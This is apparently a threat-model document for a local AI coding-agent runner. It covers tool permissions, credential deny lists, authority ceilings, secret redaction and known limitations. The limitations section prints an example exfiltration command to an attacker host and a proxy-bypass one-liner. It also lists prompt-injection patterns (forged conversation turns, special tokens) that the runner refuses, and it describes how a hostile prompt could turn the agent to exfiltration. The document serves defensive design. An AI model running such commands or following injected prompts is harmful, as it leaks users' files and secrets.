# Runner Threat Model

## Scope

This document is about the **runner**: the local agent loop, tool permissions, file access, shell access, transcripts,
archives, and traces. The bridge/OAuth layer is the model transport boundary, not the main subject of ongoing runner
design work.

The current design goal is a small default surface with explicit opt-ins. Read tools are convenient, write tools are
guarded, recovery tools are always available, shell is hidden by default, and advanced patch mode is opt-in.

## Bridge auth boundary for this playground

This playground remains **OAuth-only** at the transport layer. Upstream Anthropic calls must use a Claude Code OAuth
Bearer token. Anthropic Console API-key sources are intentionally ignored so local test results do not mix billing paths.

Sensitive bridge diagnostics are also gated: `/v1/debug` requires the local `x-claude-local-bridge-debug-token` printed
in the Claude Local Bridge Output log. That token is a local debug door code, not an upstream Claude credential.

## What the model can touch

| Category          | Tools                                                                       | Scope                                                                                                                                                                                                                                                                                                                                                               |
| ----------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Read**          | `list_files`, `read_file`, `search_text`, `glob`, `git_status`, `lsp_query` | Text reads are path-confined. `read_file` also supports images/PDF as multimodal blocks (size caps; logs redact base64). `lsp_query` is opt-in (`--enable-lsp`) and spawns a local language-server subprocess.                                                                                                                                                      |
| **Session**       | `manage_tasks`, `ask_user_question`                                         | Task checklist in the session file; structured operator questions (TTY-only, fail closed in workers and `--dont-ask`).                                                                                                                                                                                                                                              |
| **Orchestration** | `spawn_agent`                                                               | Spawns a generic read-only child runner with an explicit seven-tool set. Top-level only (`spawnDepth === 0`). Asks by default; capped at 8 spawns per run. Child inherits cwd deny matrix; cannot recurse.                                                                                                                                                          |
| **Worktree**      | `enter_worktree`, `exit_worktree`, `list_worktrees`                         | Multiple named **slots** per run (`slot` parameter); each creates an isolated git worktree on a fresh branch and switches cwd. Re-enter a slot to switch between parallel worktrees. `list_worktrees` lists active slots and orphan dirs under `~/.bridge-runner/worktrees/`. Requires a git repo. Asks by default; `cleanup=true` removes the worktree and branch. |
| **Skills**        | `run_skill`                                                                 | Loads a skill Markdown body by name from `.bridge-runner/skills/` or `.cursor/skills/`. Read-only text return — does not execute embedded shell or network instructions.                                                                                                                                                                                            |
| **Write**         | `edit_file`, `write_file`                                                   | Any file inside `cwd` that passes the deny matrix. Backups saved before mutation. Requires user confirmation (or `--accept-edits`).                                                                                                                                                                                                                                 |
| **Recovery**      | `undo`, `undo_edit`                                                         | Restore files from `.bridge-runner/backups/` or the in-memory undo log. Auto-approved.                                                                                                                                                                                                                                                                              |
| **Advanced**      | `apply_patch`                                                               | **Hidden by default** (opt in via `--tools apply_patch`). Pure-JS unified-diff apply: no shell, full hunk validation, hash-aware backup, atomic write, rollback on failure (P0-06 repaired). Prefer `edit_file` / `write_file` for ordinary edits.                                                                                                                                                                                    |
| **Shell**         | `bash`, `manage_shell_jobs`                                                 | **Opt-in only** (`--allow-shell`). Unsandboxed **local-account authority**: the process starts in `--cwd`, but commands are **not** cwd-confined — absolute/parent paths, process spawn, and network remain possible. Timeout (default 30s) and output caps apply. Regex shell-policy scanning blocks some sensitive path/env patterns as defense-in-depth. `--no-network` is a best-effort proxy env guard, **not** hard network isolation. |

## Retired profile loaders

Agent/file profiles and capability profiles are not part of the active runtime. Their historical code is stored as
non-executable text under `docs/archive/runner-profiles/`. The CLI rejects the former flags so an old command cannot
silently run with different authority. Prompt customization remains available through prompt templates and explicit
system-prompt files; authority remains controlled by explicit flags and `--tools`.

## Monotonic authority ceiling (WP2)

At run start the runner freezes an immutable **authority ceiling** from the explicit CLI flags
(`src/runner/authority.js`): `allowShell`, `plan`, `noNetwork`, and the `--tools` allowlist. Every permission check
clamps the live context to that ceiling, so a mid-run mutation of `ctx` (bug, hook, or hostile input) can **narrow**
authority but never widen it:

- Shell stays denied for the whole run unless `--allow-shell` was on the command line.
- A run started with `--plan` can never leave plan mode, and effectful tools cannot be force-executed under it
  (plan mode has no user-approval flow that could have consented).
- `--no-network` can never be dropped mid-run.
- Tools outside the `--tools` ceiling are hard-denied (`authority_ceiling` rule) regardless of later visibility changes.
- Child runners spawned via `spawn_agent` receive the **intersection** of their requested authority and the parent
  ceiling: flags AND-ed, tool lists intersected, and plan-ceiling parents never hand children `--accept-edits` or
  `--dont-ask`.

The one deliberate non-ceiling channel is per-action user confirmation: approving a single write in the terminal
escalates that one permission check only. That is human consent, not an authority widening.

## Plan mode records proposals, it does not simulate success

Plan mode (`--plan`) executes read-only tools for real and **never** executes writes. Proposed file edits are
materialized in memory with the same matching logic as the real tools and recorded as unified diffs
(`plan_proposed_effect` ledger events plus the final result's `planProposals` list). A proposal that cannot be
materialized (for example `old_string` not found) is reported as **invalid** rather than pretended to succeed, so a
plan artifact reflects reality. Non-file effects (shell, worktree, orchestration) get honest one-line descriptions.

## Run-level recovery (`local-bridge-undo` CLI)

The write tools already save a backup before every mutation and record it in the in-memory undo log. At run-exit the
runner also persists that log to a **per-run manifest** at `<cwd>/.bridge-runner/runs/<run-id>/manifest.json`. The
operator-facing `local-bridge-undo` CLI (`list-runs`, `show`, `last-run`, `run <id>`) reverts a whole run from those
backups. It is **not** a model-callable tool and adds no new model permission surface — it composes existing primitives.

| Property                  | Behavior                                                                                                               |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| Path confinement          | Revert targets pass `safety.confinePath()`; a tampered manifest pointing outside `cwd` is marked `denied` and skipped  |
| Divergence protection     | A file changed after the run (`current sha ≠ run's last write`) is `diverged` and skipped unless `--force`             |
| Created files             | A file the run created (no backup) is removed on revert; a divergent created file needs `--force`                      |
| Non-interactive fail-safe | Without `--yes`/`--dry-run` and no TTY, revert refuses (exit 2) rather than silently rewriting files                   |
| Manifest contents         | Edit paths, tool names, SHA-256 hashes, and backup paths — no file bodies. Treat as sensitive (it lists project paths) |
| Garbage collection        | None automatic in v1; manifests are pruned manually by deleting `.bridge-runner/runs/<run-id>`                         |

Manifests inherit the same secret-redaction posture as other on-disk artifacts: they store hashes and relative paths, not
file contents. The backups they point at live under `.bridge-runner/backups/` and are themselves project source — treat
both as local evidence.

## Prompt-template parameters (`--prompt-arg`)

Prompt templates (`.bridge-runner/prompts/<name>.md` + built-ins) may declare `{{name}}` placeholders filled at runtime
with `--prompt-arg key=value`. A parameter value is text spliced directly into the system/user prompt, so it is treated
as untrusted input:

| Risk                           | Mitigation                                                                                                            |
| ------------------------------ | --------------------------------------------------------------------------------------------------------------------- | --- | -------------------------------------------------------------------------------- |
| Forged conversation turns      | Values containing `\n\nHuman:` / `\n\nAssistant:` / `\n\nSystem:` are **refused**, not escaped                        |
| Special/control tokens         | `<                                                                                                                    | …   | >`, `[INST]`/`[/INST]`, and role-ish XML tags (`<system>`, `<tool>`) are refused |
| Template-composition break-out | Values containing `{{`/`}}`, a bare `---` fence, or our `## Prompt template:` / `## User request` headers are refused |
| Oversized values               | Values over 2000 characters are refused                                                                               |
| Missing required parameters    | The run fails **before** any model call, rather than sending a half-filled template                                   |

Template **bodies** are author-controlled text (same trust level as `.bridge-runner/SYSTEM.md`); only the parameter
_values_ are gated. This is refusal-by-default, not best-effort escaping.

## What the model can NEVER touch

These are enforced at the permission layer **before any tool executes**. No CLI flag can override them.

### Secret files (deny matrix)

Path patterns that are **always denied** for both read and write:

| Pattern             | Examples blocked                                                                         |
| ------------------- | ---------------------------------------------------------------------------------------- |
| `.env` files        | `.env`, `.env.test`, `.envrc`, `.env.example`                                            |
| SSH/credential dirs | `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`                                                  |
| Private keys        | `id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.p8`, `*.p12`, `*.pfx`                       |
| Credential files    | `credentials*.json`, service-account JSON, Firebase admin SDK JSON, `*.netrc`, `*.npmrc` |
| Token files         | Files matching `token*`, `*_token`, `*secret*`                                           |
| System dirs         | `.git/`, `node_modules/`                                                                 |

### Path escapes

- **Absolute paths** (`/etc/passwd`) → denied before realpath check
- **`../` traversal** that escapes `cwd` → caught by realpath containment
- **Symlink escapes** → `fs.realpathSync` resolves the true path and checks against `cwd`

### Shell restrictions (when `bash` is enabled)

- **Blocked path patterns** in command text: `.env`, `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`, `id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.p8`, `*.p12`, service-account names
- **Blocked env var references**: `$ANTHROPIC_API_KEY`, `$AWS_ACCESS_KEY_ID`, `$GH_TOKEN`, `$SSH_AUTH_SOCK` (and braced `${}` variants)
- **Filtered environment**: `execSync` runs with scrubbed `process.env` — no `AWS_*`, `ANTHROPIC_*`, `CLAUDE_*`, `OPENAI_*`, `GH_TOKEN`, `NPM_TOKEN`, or `SSH_AUTH_SOCK`

## How protections compose

```
User prompt
  → validateCwd() rejects system dirs and non-existent paths
  → evaluateWorkspaceTrust() — no tools until cwd is consented (--trust-workspace or interactive y)
  → Runner sends model request through the local bridge
  → Model returns tool_use blocks
  → Final message-contract validation:
      - exact tool_use_id/tool_result membership (order-independent)
      - one atomic result batch immediately after each assistant tool batch
      - reject duplicate, orphaned, missing, or misplaced IDs before network I/O
  → permissions.check():
      1. confinePath() — realpath containment → deny on escape
      2. isPathBlockedByDenyMatrix() — glob patterns → deny on match (severity: hard_deny)
      3. Shell arg scanning — command text inspection → deny on pattern (severity: hard_deny)
      4. Category-based decision — allow/ask/deny with severity metadata
  → If ask: user confirms interactively
  → tool.execute() runs with:
      - safeEnv for shell commands (stripped process.env)
      - cwdRealpath confinement
  → runAndScrub() redacts secrets from result text
  → Result flows into messages, transcript, stream-json
```

## Workspace trust gate (P0)

Before any tool runs, the runner checks whether `--cwd` has been explicitly trusted on this machine.

| Mode                 | Behavior                                                               |
| -------------------- | ---------------------------------------------------------------------- |
| Interactive TTY      | Prompts once; records consent in `~/.bridge-runner/trust.json`         |
| CI / non-interactive | Requires `--trust-workspace`; fail closed with `workspace_not_trusted` |
| Prior consent        | Skips prompt when fingerprint matches stored record                    |

**Effect:** Untrusted workspaces cannot read or write files — not even read-only tools. Hooks and auto-memory writes also require workspace trust plus `--trusted-workspace` where applicable.

## Permission severity

| Severity          | Meaning                                             | Bypass                                                            |
| ----------------- | --------------------------------------------------- | ----------------------------------------------------------------- |
| `hard_deny`       | Deny matrix paths, path escapes, shell scanner hits | Never — survives `--accept-edits`, `--dont-ask`, and `--chaos-ok` |
| `bypassable_ask`  | Write/shell in default mode                         | `--accept-edits` or user confirmation                             |
| `bypassable_deny` | Shell disabled                                      | `--allow-shell`                                                   |

## `--chaos-ok` (explicit risky mode)

The flag `--chaos-ok` is required to combine `--allow-shell`, `--accept-edits`, and `--dont-ask` in one run. It removes most interactive prompts but **does not** disable `hard_deny` path guards (`.env`, `.ssh/`, credentials, etc.).

## Secret redaction (defense in depth)

Even if a blocked file is somehow read, sensitive text passes through the redaction boundary before
sink fan-out (P0-11):

- Tool result text (`runAndScrub` / streaming scrubber)
- Assistant text on stdout, `--json`, and `--stream-json`
- Live SSE text deltas (streaming scrubber; chunk-split secrets)
- Display copies of tool inputs (execution still receives raw inputs)
- Session files on disk (in-memory messages stay raw for the live loop)
- Ledger payloads at append time
- Transcript logs, human logs, archives, traces (existing scrubbers)

The streaming scrubber is **split-invariant** (P1-11): output depends only on total content, never on
where chunk boundaries fall. Complete lines are scrubbed as whole units, multi-line private-key
blocks are held by a bounded fence parser (oversized blocks are redacted fail-closed), and memory is
bounded even for pathological single-line output.

Runner-owned artifacts under `.bridge-runner/` and `~/.bridge-runner/` are also **private by
construction** (dirs `0700`, files `0600`; P0-12). `--no-session-persistence` disables resume
checkpoints (`*.state.json`) only — recovery manifests and diagnostics may still write.

Redacted patterns:

| Original                                 | Redacted as                    |
| ---------------------------------------- | ------------------------------ |
| `sk-ant-...` (Anthropic keys)            | `[REDACTED:anthropic_key]`     |
| `sk-...` style API keys                  | `[REDACTED:generic_api_key]`   |
| `-----BEGIN ... PRIVATE KEY-----` blocks | `[REDACTED:private_key_block]` |
| `ghp_...` / `gho_...` (GitHub tokens)    | `[REDACTED:github_token]`      |
| `AKIA...` (AWS access keys)              | `[REDACTED:aws_access_key]`    |
| `Bearer ...` (OAuth tokens)              | `Bearer [REDACTED]`            |
| `eyJ...` (JWTs)                          | `[REDACTED:jwt]`               |
| `SECRET=...` / `TOKEN=...` assignments   | `*= [REDACTED]`                |

## Budget telemetry and token caps

The runner exposes live budget signals for long sessions and nested `spawn_agent` children:

| Flag                     | Behavior                                                                   |
| ------------------------ | -------------------------------------------------------------------------- |
| `--max-wall-clock-ms`    | Hard stop when wall time exceeds N ms (existing)                           |
| `--max-cost-usd`         | Hard stop when estimated cost exceeds N USD (existing)                     |
| `--budget-input-tokens`  | Hard stop when cumulative API `input_tokens` reach N; soft warning at 80%  |
| `--budget-output-tokens` | Hard stop when cumulative API `output_tokens` reach N; soft warning at 80% |

Stream-json and flight-recorder traces may include `{ type: "budget", input_tokens, output_tokens, wall_ms, spawns, depth }`
at tool boundaries. Soft warnings surface as `budget_warning` events and stderr hints; they do not bypass permission
guards. Child agents inherit the parent's **remaining** token budget via CLI flags on the worker subprocess.

Hard-cap termination stops the loop at the next boundary; it does **not** auto-revert in-flight edits — use recovery
tools (`undo`, run manifests when available) if a partial run must be rolled back.

## Explicit tool allowlists

`--tools`/`--allowed-tools` is the only per-tool visibility layer. It intersects with dedicated feature gates:
requesting `bash` still requires `--allow-shell`, requesting LSP still requires `--enable-lsp`, and child runners cannot
request `spawn_agent`. The hard-deny matrix remains independent and cannot be bypassed by any visibility flag.

## Executable hooks (`.bridge-runner/hooks.json`)

Hooks can log lifecycle events or run trusted shell commands when `"action": "exec"` or `"run"` is set.

| Risk                                   | Mitigation                                                                         |
| -------------------------------------- | ---------------------------------------------------------------------------------- |
| Arbitrary command execution            | Requires workspace trust **and** `"trusted": true` in hooks.json                   |
| Secret exfiltration via hook output    | Hook stdout/stderr pass through `scrubSecrets()` before logging                    |
| Reading `.env` / keys via hook command | Same `scanShellCommand()` hard-deny patterns as `bash`                             |
| Network egress                         | Hook env inherits scrubbed `buildSafeEnv()`; `--no-network` proxy guard applies    |
| Runaway hook                           | `spawnSync` timeout (default 120s, max 120s); output capped at 8KB in hook results |

Exec hooks are **user-configured**, not model-callable. The model cannot add or modify hook commands mid-run.

## Multimodal read_file and LSP

| Risk                          | Mitigation                                                                                     |
| ----------------------------- | ---------------------------------------------------------------------------------------------- |
| Large image/PDF token burn    | Hard caps (7MB images, 10MB PDFs); human logs/transcripts store summaries, not base64 payloads |
| Reading sensitive screenshots | Same deny matrix as text reads (`.env`, keys blocked)                                          |
| Arbitrary LSP subprocess      | Opt-in `--enable-lsp`; scrubbed env; sessions disposed at run end; read-only tool category     |
| Missing language server       | Fail closed with install hint; no shell fallback                                               |

## Known limitations

### 1. Shell is unsandboxed local-account authority (documented honesty)

Enabling `--allow-shell` exposes `bash` / `manage_shell_jobs` with the same OS account rights as the runner process.
The shell process **starts** in `--cwd`, but that is a starting directory only — not a jail. Commands can read absolute
and parent paths that are not caught by the regex deny list, spawn other processes, and reach the network.

**Mitigation in place:** Shell stays hidden unless explicitly enabled. Interactive confirmation shows the proposed
command plus an honesty line. Regex scanning blocks some sensitive path and credential-env patterns. Timeout and
output caps limit runaway commands.

**Remaining risk:** Portable OS isolation (containers, Seatbelt, Landlock, etc.) is a separate project. Do not treat
regex scanning or `--no-network` as a sandbox.

### 2. No hard outbound network restriction (mitigated)

The `bash` tool can make outbound HTTP requests (`curl`, `wget`, `nc`). There is no egress filtering at the socket or process level. A determined prompt could exfiltrate project files via `curl -d @secret.txt https://attacker.com`.

**Mitigation in place:** File-level deny matrix prevents reading `.env`, `.ssh/`, `.aws/`, key files. Shell arg scanning rejects obvious attempts to reference these paths. The `--no-network` flag adds a best-effort proxy guard by setting `http_proxy`/`https_proxy` to `127.0.0.1:1` in the bash environment, blocking most HTTP/HTTPS egress.

**Remaining risk:** The proxy env vars can be unset by the command itself (`unset http_proxy && curl ...`). Non-HTTP protocols (DNS, raw TCP via `nc`, `ncat`) are not affected by proxy settings at all. For strong isolation, use macOS `pf` firewall rules (`/etc/pf.conf`) or run the runner inside a network-restricted VM/container.

### 3. File size hard cap

`read_file` has configurable `max_bytes`/`max_lines` defaults (50KB/1000 lines), but the model can override them. A hard cap of 1MB (`MAX_BYTES_HARD_CAP`) is now enforced server-side. Requests exceeding this cap are truncated.

### 4. Shell output size hard cap

`bash` tool output is now truncated at 100,000 characters (100KB). The `execSync`/`spawnSync` buffer is capped at 1MB. Stderr is captured and prefixed with `[stderr]` on success.

### 5. No rate limiting on tool calls

The model can make unlimited tool calls within `max_steps`. There's no per-second or per-minute rate limit on shell commands.

### 6. Transcript contains source code

Transcript JSONL files include tool results (file contents, shell output). These contain project source code. Treat transcripts as sensitive.

Flight-recorder traces are a separate opt-in artifact. `summary` traces keep metadata such as sizes, tool names,
permission decisions, usage counters, response statuses, and header names. `redacted` and `full` traces can also contain
scrubbed prompt bodies, model payloads, tool inputs, tool results, and upstream response previews. Treat those trace
files as sensitive local evidence even though authorization and key-looking fields are redacted.

### 7. Command injection in search_text (mitigated)

The `search_text` tool constructs shell commands from the user's pattern. Shell metacharacters are now properly escaped using single-quote wrapping with internal quote escaping.

### 8. undo/undo_edit/apply_patch path validation (mitigated)

`undo` and `undo_edit` validate paths through `safety.confinePath()` before operating. This prevents path traversal attacks (e.g., `--path ../../../etc/passwd`).

`apply_patch` is **repaired** (P0-06): pure JavaScript unified-diff apply with `confinePath`, full hunk validation before any write, shared hash-aware backups + atomic writes, and restore-from-backup on write/post-write failure. Filenames and patch text never reach a shell. Still hidden unless named in `--tools`.

### 8b. search_text deny-matrix parity (mitigated)

`search_text` applies `safety.isFileCandidateAllowed` (realpath confinement + deny matrix) to every candidate before contents can reach the model, across ripgrep, grep, and Node walk backends. Symlink aliases that escape `--cwd` or land on denied files are skipped.

### 9. write_file content validation (mitigated)

`write_file` now validates that `content` is a string and the path passes `confinePath()`. Missing content returns an error instead of crashing.
